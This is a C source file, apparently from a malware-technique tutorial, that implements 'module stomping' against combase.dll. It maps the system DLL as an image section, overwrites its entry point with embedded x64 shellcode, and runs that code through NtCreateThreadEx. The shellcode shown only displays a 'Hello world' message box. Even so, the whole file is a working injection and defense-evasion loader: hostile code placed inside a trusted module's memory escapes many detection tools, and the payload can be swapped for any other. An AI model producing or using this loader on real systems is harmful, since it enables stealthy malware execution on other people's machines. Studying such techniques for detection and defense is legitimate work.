/* 
 * hack.c - module stomping
 * victim DLL: combase.dll
 * author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>

#define VICTIM_DLL  L"C:\\Windows\\System32\\combase.dll"

#define STATUS_SUCCESS      0x00000000
#define NtCurrentProcess()  ( (HANDLE)-1 )
#define NT_SUCCESS(STATUS)  (((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[3];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
    OUT PHANDLE        SectionHandle,
    IN  ACCESS_MASK      DesiredAccess,
    IN  POBJECT_ATTRIBUTES  ObjectAttributes  OPTIONAL,
    IN  PLARGE_INTEGER    MaximumSize      OPTIONAL,
    IN  ULONG        SectionPageProtection,
    IN  ULONG        AllocationAttributes,
    IN  HANDLE        FileHandle      OPTIONAL
    );

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
    IN    HANDLE      SectionHandle,
    IN    HANDLE      ProcessHandle,
    IN OUT  PVOID* BaseAddress,
    IN    SIZE_T      ZeroBits,
    IN    SIZE_T      CommitSize,
    IN OUT  PLARGE_INTEGER  SectionOffset    OPTIONAL,
    IN OUT  PSIZE_T      ViewSize,
    IN    SECTION_INHERIT InheritDisposition,
    IN    ULONG      AllocationType,
    IN    ULONG      Protect
    );

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
    PHANDLE                 ThreadHandle,
    ACCESS_MASK             DesiredAccess,
    POBJECT_ATTRIBUTES      ObjectAttributes,
    HANDLE                  ProcessHandle,
    PVOID                   StartRoutine,
    PVOID                   Argument,
    ULONG                   CreateFlags,
    SIZE_T                  ZeroBits,
    SIZE_T                  StackSize,
    SIZE_T                  MaximumStackSize,
    PPS_ATTRIBUTE_LIST      AttributeList
    );

// x64 shellcode (messageBox "Hello world")
unsigned char rawData[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main() {
    NTSTATUS STATUS = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    HANDLE hThread = NULL;
    PVOID uMappedModule = NULL;
    SIZE_T sViewSize = 0;
    ULONG_PTR uEntryPoint = 0;
    DWORD dwOldProtection = 0;

    // 1. resolve NT APIs
    HMODULE hNtdll = GetModuleHandleW(L"NTDLL");
    if (!hNtdll) return -1;

    fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!pNtCreateSection || !pNtMapViewOfSection || !pNtCreateThreadEx) return -1;

    printf("press <Enter> to load DLL...");
    getchar();

    // 2. open victim DLL file
    hFile = CreateFileW(VICTIM_DLL, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW failed: %d\n", GetLastError());
        return -1;
    }

    // 3. create image section
    STATUS = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(STATUS)) {
        printf("NtCreateSection failed: 0x%0.8X\n", STATUS);
        return -1;
    }

    // 4. map view of section
    STATUS = pNtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedModule, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(STATUS)) {
        printf("NtMapViewOfSection failed: 0x%0.8X\n", STATUS);
        CloseHandle(hSection);
        return -1;
    }

    // 5. parse PE Headers for entry point and .text section verification
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return -1;

    uEntryPoint = (ULONG_PTR)uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

    ULONG_PTR uTextAddress = 0;
    SIZE_T sTextSize = 0;
    PIMAGE_SECTION_HEADER pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if (strncmp((const char*)pImgSecHdr[i].Name, ".text", 5) == 0) {
            uTextAddress = (ULONG_PTR)uMappedModule + pImgSecHdr[i].VirtualAddress;
            sTextSize = pImgSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!uTextAddress || !sTextSize) {
        printf("could not find .text section\n");
        goto _CLEANUP;
    }

    SIZE_T sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddress);
    printf("victim DLL loaded at: 0x%p\n", uMappedModule);
    printf("entry point address: 0x%p\n", (PVOID)uEntryPoint);
    printf("shellcode size: %zu, available space in .text: %zu\n", sizeof(rawData), sTextSizeLeft);

    if (sTextSizeLeft < sizeof(rawData)) {
        printf("shellcode too large for target section\n");
        goto _CLEANUP;
    }

    // 6. overwrite entry point
    printf("press <Enter> to stomp...");
    getchar();

    if (!VirtualProtect((LPVOID)uEntryPoint, sizeof(rawData), PAGE_READWRITE, &dwOldProtection)) {
        printf("VirtualProtect (RW) failed: %d\n", GetLastError());
        goto _CLEANUP;
    }

    memcpy((PVOID)uEntryPoint, rawData, sizeof(rawData));

    if (!VirtualProtect((LPVOID)uEntryPoint, sizeof(rawData), dwOldProtection, &dwOldProtection)) {
        printf("VirtualProtect (restore) failed: %d\n", GetLastError());
        goto _CLEANUP;
    }

    printf("press <Enter> to execute via NtCreateThreadEx...");
    getchar();

    // 7. execute via NtCreateThreadEx
    STATUS = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (PVOID)uEntryPoint, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(STATUS)) {
        printf("executing NtCreateThreadEx failed: 0x%0.8X\n", STATUS);
        goto _CLEANUP;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

_CLEANUP:
    if (hSection) CloseHandle(hSection);
    return 0;
}